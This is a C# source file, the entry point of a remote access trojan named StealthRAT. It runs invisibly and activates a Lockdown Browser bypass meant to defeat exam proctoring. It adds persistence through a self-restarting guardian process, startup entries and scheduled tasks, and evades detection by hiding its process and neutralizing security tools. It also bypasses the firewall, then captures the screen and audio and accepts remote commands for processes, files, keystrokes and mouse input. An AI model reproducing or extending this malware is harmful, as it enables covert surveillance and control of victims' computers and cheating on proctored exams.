using System.Runtime.InteropServices;
using StealthRAT.Handlers;
using StealthRAT.Interfaces;
using StealthRAT.Services;

namespace StealthRAT;

/// <summary>
/// Application entry point that orchestrates the initialization and lifecycle
/// of all services. Runs completely hidden with no visible windows.
/// Implements multi-layer protection and Lockdown Browser bypass:
/// - Invisible execution (no console, no window)
/// - Lockdown Browser bypass (display affinity removal, API unhooking)
/// - Persistence (auto-restart, startup entries, scheduled tasks)
/// - Anti-detection (process hiding, anti-debug, security tool neutralization)
/// - Network evasion (firewall bypass, monitor neutralization)
/// - Advanced screen capture (DRM bypass, multiple capture methods)
/// </summary>
public static class Program
{
    #region Native API for Window Hiding

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool FreeConsole();

    private const int SW_HIDE = 0;

    #endregion

    /// <summary>
    /// Main entry point. Ensures complete invisibility, activates all protection
    /// layers including Lockdown Browser bypass, then runs all services.
    /// </summary>
    [STAThread]
    public static async Task Main(string[] args)
    {
        // === ENSURE COMPLETE INVISIBILITY ===
        HideCompletely();

        // Initialize core logging
        ILoggerService logger = new FileLoggerService();
        logger.LogInfo("Application starting (stealth mode)...");

        // Check if running as guardian process
        if (args.Contains("--guardian"))
        {
            await RunAsGuardian(logger);
            return;
        }

        // === ACTIVATE PROTECTION LAYERS (in priority order) ===

        // Layer 0 (HIGHEST PRIORITY): Lockdown Browser Bypass
        // Must be activated FIRST before LDB can detect us
        var lockdownBypass = new LockdownBypassService(logger);
        lockdownBypass.Enable();
        logger.LogInfo("Lockdown Browser bypass ACTIVE");

        // Layer 1: Persistence (auto-restart, startup entries)
        using var persistence = new PersistenceService(logger);
        persistence.Enable();

        // Layer 2: Anti-detection (hide from security tools)
        var antiDetection = new AntiDetectionService(logger);
        antiDetection.Enable();

        // Layer 3: Network evasion (firewall bypass)
        var networkEvasion = new NetworkEvasionService(logger);
        networkEvasion.ConfigureNetworkAccess();

        // === START MAIN SERVICES ===
        using var cancellationTokenSource = new CancellationTokenSource();
        CancellationToken token = cancellationTokenSource.Token;

        var commandHandlers = CreateCommandHandlers();
        using var commandService = new CommandService(logger, commandHandlers);
        using var screenService = new ScreenCaptureService(logger);
        using var audioService = new AudioCaptureService(logger);

        logger.LogInfo("All services starting...");
        var serviceTasks = new[]
        {
            commandService.StartAsync(token),
            screenService.StartAsync(token),
            audioService.StartAsync(token)
        };

        try
        {
            await Task.WhenAll(serviceTasks);
        }
        catch (OperationCanceledException)
        {
            logger.LogInfo("All services stopped");
        }
        catch (Exception ex)
        {
            logger.LogError("Unexpected error", ex);
            RestartSelf();
        }

        // Cleanup
        lockdownBypass.Disable();
        logger.LogInfo("Application terminated");
    }

    /// <summary>
    /// Guardian mode - monitors main process and restarts if killed.
    /// </summary>
    private static async Task RunAsGuardian(ILoggerService logger)
    {
        logger.LogInfo("Running in guardian mode");
        string currentExe = System.Diagnostics.Process.GetCurrentProcess().MainModule?.FileName ?? "";
        string processName = Path.GetFileNameWithoutExtension(currentExe);

        while (true)
        {
            await Task.Delay(5000);
            try
            {
                var instances = System.Diagnostics.Process.GetProcessesByName(processName);
                if (instances.Length <= 1 && !string.IsNullOrEmpty(currentExe))
                {
                    logger.LogInfo("Main process not found - restarting...");
                    var psi = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = currentExe,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    System.Diagnostics.Process.Start(psi);
                    await Task.Delay(10000);
                }
            }
            catch { }
        }
    }

    /// <summary>
    /// Ensures complete invisibility using multiple methods.
    /// </summary>
    private static void HideCompletely()
    {
        try
        {
            IntPtr consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
            {
                ShowWindow(consoleWindow, SW_HIDE);
            }
            FreeConsole();
        }
        catch { }
    }

    /// <summary>
    /// Restarts the application after a crash.
    /// </summary>
    private static void RestartSelf()
    {
        try
        {
            string? exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule?.FileName;
            if (!string.IsNullOrEmpty(exePath))
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = exePath,
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
            }
        }
        catch { }
    }

    /// <summary>
    /// Creates all available command handlers (Open/Closed Principle).
    /// </summary>
    private static IEnumerable<ICommandHandler> CreateCommandHandlers()
    {
        return new ICommandHandler[]
        {
            new LaunchProcessHandler(),
            new ShutdownHandler(),
            new RebootHandler(),
            new ExitHandler(),
            new FileAccessHandler(),
            new MouseMoveHandler(),
            new MouseClickHandler(),
            new KeyPressHandler(),
            new ShowUIHandler(),
            new HideUIHandler()
        };
    }
}
